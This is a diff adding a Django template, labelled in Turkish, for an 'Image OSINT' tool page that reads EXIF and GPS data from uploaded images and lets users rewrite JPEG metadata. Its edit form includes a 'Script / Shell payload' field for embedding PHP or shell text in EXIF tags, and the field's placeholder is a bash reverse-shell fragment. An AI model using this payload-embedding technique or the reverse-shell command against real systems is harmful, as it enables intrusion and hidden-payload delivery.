@@ -1,0 +1,259 @@
+{% extends 'base.html' %}
+{% load static %}
+
+{% block title %}Image OSINT | CYBER OPS{% endblock %}
+
+{% block extra_css %}
+<link rel="stylesheet" href="{% static 'css/pages/image_osint.css' %}">
+{% endblock %}
+
+{% block content %}
+<div class="page-image-osint">
+    <div class="mb-8">
+        <p class="text-[10px] tracking-[0.3em] text-zinc-500 uppercase">Modül 04</p>
+        <h2 class="font-display text-3xl font-bold tracking-wide flex items-center gap-2 mt-1">
+            <span class="material-symbols-outlined text-emerald-400">image</span>
+            Image / Metadata OSINT
+        </h2>
+        <p class="text-zinc-500 text-sm mt-2">EXIF · GPS · cihaz · boyut · ICC</p>
+    </div>
+
+    <div class="space-y-6">
+        <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5 max-w-2xl">
+            <h3 class="font-display text-lg text-zinc-100 flex items-center gap-2">
+                <span class="material-symbols-outlined text-zinc-500">upload</span>
+                Görsel yükle
+            </h3>
+            <p class="text-xs text-zinc-500 mt-1 mb-4">JPG, PNG, GIF, WebP, TIFF · max 10 MB</p>
+            <form action="{% url 'image_osint' %}" method="post" enctype="multipart/form-data" class="space-y-3">
+                {% csrf_token %}
+                <input type="file" name="image" accept="image/*" required
+                    class="block w-full text-sm text-zinc-400 file:mr-4 file:rounded file:border-0 file:bg-zinc-800 file:px-4 file:py-2 file:text-zinc-200 hover:file:bg-zinc-700">
+                <button type="submit" class="inline-flex items-center gap-1 rounded-md bg-zinc-100 px-4 py-2 text-sm text-zinc-900 hover:bg-white">
+                    <span class="material-symbols-outlined text-base">document_scanner</span>
+                    Metadata çıkar
+                </button>
+            </form>
+        </section>
+
+        {% if success %}
+        <div class="rounded-lg border border-emerald-900 bg-emerald-950/40 p-5 text-sm text-emerald-200 flex gap-2 max-w-2xl">
+            <span class="material-symbols-outlined text-emerald-400 shrink-0">check_circle</span>
+            <p>{{ success }}</p>
+        </div>
+        {% endif %}
+
+        {% if error %}
+        <div class="rounded-lg border border-red-900 bg-red-950/50 p-5 text-sm text-red-200 flex gap-2 max-w-2xl">
+            <span class="material-symbols-outlined text-red-400 shrink-0">error</span>
+            <p>{{ error }}</p>
+        </div>
+        {% endif %}
+
+        {% if metadata and file %}
+        {% include 'partials/analiz_kaydet.html' %}
+        <div class="grid grid-cols-1 xl:grid-cols-2 gap-4">
+            <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5">
+                <h3 class="font-display text-lg text-zinc-100 mb-4">Önizleme</h3>
+                <img src="/{{ file.media_url }}" alt="Yüklenen görsel" class="preview-img w-full rounded border border-zinc-800 bg-black">
+                <dl class="mt-4 space-y-2 text-sm">
+                    <div class="grid grid-cols-[6rem_1fr] gap-2"><dt class="text-zinc-500">Dosya</dt><dd class="break-all">{{ file.original_name }}</dd></div>
+                    <div class="grid grid-cols-[6rem_1fr] gap-2"><dt class="text-zinc-500">Boyut</dt><dd>{{ file.size }} byte</dd></div>
+                    <div class="grid grid-cols-[6rem_1fr] gap-2"><dt class="text-zinc-500">MIME</dt><dd>{{ file.content_type }}</dd></div>
+                </dl>
+            </section>
+
+            <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5">
+                <h3 class="font-display text-lg text-zinc-100 mb-4">Temel bilgi</h3>
+                <dl class="space-y-2 text-sm">
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Format</dt><dd>{{ metadata.basic.format }}</dd></div>
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Mod</dt><dd>{{ metadata.basic.mode }}</dd></div>
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Çözünürlük</dt><dd>{{ metadata.basic.width }} × {{ metadata.basic.height }} px</dd></div>
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Megapixel</dt><dd>{{ metadata.basic.megapixels }} MP</dd></div>
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Animasyon</dt><dd>{% if metadata.basic.is_animated %}Evet ({{ metadata.basic.frame_count }} kare){% else %}Hayır{% endif %}</dd></div>
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">ICC profil</dt><dd>{{ metadata.basic.icc_profile }}</dd></div>
+                    {% if metadata.basic.dpi %}
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">DPI</dt><dd>{{ metadata.basic.dpi }}</dd></div>
+                    {% endif %}
+                </dl>
+            </section>
+
+            {% if metadata.exif.count %}
+            <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5">
+                <h3 class="font-display text-lg text-zinc-100 mb-4">EXIF (özet)</h3>
+                <dl class="space-y-2 text-sm max-h-80 overflow-auto">
+                    {% for name, value in metadata.exif.tags.items %}
+                    <div class="grid grid-cols-[8rem_1fr] gap-2">
+                        <dt class="text-zinc-500">{{ name }}</dt>
+                        <dd class="text-zinc-300 break-all">{{ value }}</dd>
+                    </div>
+                    {% endfor %}
+                </dl>
+                <p class="text-xs text-zinc-600 mt-3">{{ metadata.exif.count }} etiket toplam</p>
+            </section>
+            {% else %}
+            <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5">
+                <h3 class="font-display text-lg text-zinc-100 mb-2">EXIF</h3>
+                <p class="text-sm text-zinc-600">EXIF metadata yok (sıkıştırma / gizlilik ile silinmiş olabilir).</p>
+            </section>
+            {% endif %}
+
+            <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5">
+                <h3 class="font-display text-lg text-zinc-100 mb-4">GPS</h3>
+                {% if metadata.gps.available %}
+                <dl class="space-y-2 text-sm">
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Enlem</dt><dd>{{ metadata.gps.latitude }}</dd></div>
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Boylam</dt><dd>{{ metadata.gps.longitude }}</dd></div>
+                    {% if metadata.gps.altitude %}
+                    <div class="grid grid-cols-[7rem_1fr] gap-2"><dt class="text-zinc-500">Yükseklik</dt><dd>{{ metadata.gps.altitude }}</dd></div>
+                    {% endif %}
+                </dl>
+                <a href="https://www.google.com/maps?q={{ metadata.gps.latitude }},{{ metadata.gps.longitude }}" target="_blank" rel="noopener"
+                    class="inline-flex items-center gap-1 mt-4 text-sm text-zinc-300 hover:text-white border border-zinc-700 px-3 py-1.5 rounded">
+                    <span class="material-symbols-outlined text-base">map</span>
+                    Haritada aç
+                </a>
+                {% else %}
+                <p class="text-sm text-zinc-600">GPS koordinatı yok.</p>
+                {% endif %}
+            </section>
+
+            {% if metadata.exif.all_tags %}
+            <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5 xl:col-span-2">
+                <h3 class="font-display text-lg text-zinc-100 mb-4">Tüm EXIF etiketleri</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-x-6 gap-y-2 text-xs max-h-96 overflow-auto">
+                    {% for name, value in metadata.exif.all_tags.items %}
+                    <div class="grid grid-cols-[9rem_1fr] gap-2 border-b border-zinc-800/80 py-1">
+                        <span class="text-zinc-500">{{ name }}</span>
+                        <span class="text-zinc-400 break-all">{{ value }}</span>
+                    </div>
+                    {% endfor %}
+                </div>
+            </section>
+            {% endif %}
+        </div>
+
+        {% if edit_form %}
+        <section class="bg-zinc-950 border border-zinc-800 rounded-lg p-5 xl:col-span-2 max-w-4xl">
+            <h3 class="font-display text-lg text-zinc-100 flex items-center gap-2 mb-1">
+                <span class="material-symbols-outlined text-amber-400">edit_note</span>
+                Metadata düzenle
+            </h3>
+            <p class="text-xs text-zinc-500 mb-4">
+                Script / shell metnini <strong class="text-zinc-400">UserComment</strong> alanına gömer.
+                Yalnızca yetkili test ve kendi görselleriniz için kullanın. Sosyal medya EXIF'i sıklıkla siler.
+            </p>
+
+            {% if not can_write_exif %}
+            <div class="rounded border border-amber-900/80 bg-amber-950/30 p-4 text-sm text-amber-200/90 mb-4 flex gap-2">
+                <span class="material-symbols-outlined text-amber-400 shrink-0">info</span>
+                <p>EXIF yazma yalnızca <strong>JPEG</strong> için desteklenir. Bu dosyayı JPG olarak yeniden yükleyin.</p>
+            </div>
+            {% endif %}
+
+            <form action="{% url 'image_osint' %}" method="post" class="metadata-edit-form space-y-4 {% if not can_write_exif %}opacity-60 pointer-events-none{% endif %}">
+                {% csrf_token %}
+                <input type="hidden" name="action" value="apply_metadata">
+                <input type="hidden" name="source_path" value="{{ file.relative_path }}">
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">Make</span>
+                        <input type="text" name="make" value="{{ edit_form.make }}" maxlength="256"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm">
+                    </label>
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">Model</span>
+                        <input type="text" name="model" value="{{ edit_form.model }}" maxlength="256"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm">
+                    </label>
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">Software</span>
+                        <input type="text" name="software" value="{{ edit_form.software }}" maxlength="256"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm">
+                    </label>
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">Artist</span>
+                        <input type="text" name="artist" value="{{ edit_form.artist }}" maxlength="256"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm">
+                    </label>
+                    <label class="block text-sm md:col-span-2">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">Copyright</span>
+                        <input type="text" name="copyright" value="{{ edit_form.copyright }}" maxlength="256"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm">
+                    </label>
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">DateTime</span>
+                        <input type="text" name="datetime" value="{{ edit_form.datetime }}" placeholder="2026:09:02 12:00:00"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm font-mono text-xs">
+                    </label>
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">DateTimeOriginal</span>
+                        <input type="text" name="datetime_original" value="{{ edit_form.datetime_original }}" placeholder="2026:09:02 12:00:00"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm font-mono text-xs">
+                    </label>
+                </div>
+
+                <label class="block text-sm">
+                    <span class="text-zinc-500 text-xs uppercase tracking-wide">ImageDescription</span>
+                    <input type="text" name="image_description" value="{{ edit_form.image_description }}" maxlength="1024"
+                        class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm">
+                </label>
+
+                <label class="block text-sm">
+                    <span class="text-zinc-500 text-xs uppercase tracking-wide">UserComment</span>
+                    <textarea name="user_comment" rows="3" maxlength="65536"
+                        class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm font-mono text-xs">{{ edit_form.user_comment }}</textarea>
+                </label>
+
+                <label class="block text-sm">
+                    <span class="text-zinc-500 text-xs uppercase tracking-wide flex items-center gap-1">
+                        <span class="material-symbols-outlined text-base text-red-400">code</span>
+                        Script / Shell payload
+                    </span>
+                    <textarea name="script_payload" rows="6" maxlength="65536" placeholder="<?php ... ?>  veya  bash -i >& /dev/tcp/..."
+                        class="mt-1 w-full rounded border border-red-900/50 bg-zinc-900 px-3 py-2 text-amber-100 text-sm font-mono text-xs">{{ edit_form.script_payload }}</textarea>
+                    <p class="text-[10px] text-zinc-600 mt-1">Doluysa UserComment alanına yazılır (script alanı önceliklidir). Sunucuda çalıştırılmaz — yalnızca EXIF metni.</p>
+                </label>
+
+                <label class="inline-flex items-center gap-2 text-sm text-zinc-400 cursor-pointer">
+                    <input type="checkbox" name="mirror_payload_to_description" class="rounded border-zinc-600 bg-zinc-900">
+                    Payload dolu ve ImageDescription boşsa, payload'ı ImageDescription'a da yaz
+                </label>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2 border-t border-zinc-800">
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">GPS Enlem</span>
+                        <input type="text" name="latitude" value="{{ edit_form.latitude }}" placeholder="41.0082"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm font-mono">
+                    </label>
+                    <label class="block text-sm">
+                        <span class="text-zinc-500 text-xs uppercase tracking-wide">GPS Boylam</span>
+                        <input type="text" name="longitude" value="{{ edit_form.longitude }}" placeholder="28.9784"
+                            class="mt-1 w-full rounded border border-zinc-700 bg-zinc-900 px-3 py-2 text-zinc-200 text-sm font-mono">
+                    </label>
+                </div>
+
+                <div class="flex flex-wrap items-center gap-3 pt-2">
+                    <button type="submit" class="inline-flex items-center gap-1 rounded-md bg-amber-500/90 px-4 py-2 text-sm text-zinc-950 hover:bg-amber-400 font-medium">
+                        <span class="material-symbols-outlined text-base">save</span>
+                        Metadata yaz &amp; kaydet
+                    </button>
+                    {% if edited_file %}
+                    <a href="/{{ edited_file.media_url }}" download="{{ edited_file.stored_name }}"
+                        class="inline-flex items-center gap-1 rounded-md border border-emerald-700 bg-emerald-950/50 px-4 py-2 text-sm text-emerald-200 hover:bg-emerald-900/50">
+                        <span class="material-symbols-outlined text-base">download</span>
+                        Düzenlenmiş JPEG indir
+                    </a>
+                    {% if edited_file.written_fields %}
+                    <span class="text-xs text-zinc-500">Yazılan: {{ edited_file.written_fields|join:", " }}</span>
+                    {% endif %}
+                    {% endif %}
+                </div>
+            </form>
+        </section>
+        {% endif %}
+        {% endif %}
+    </div>
+</div>
+{% endblock %}
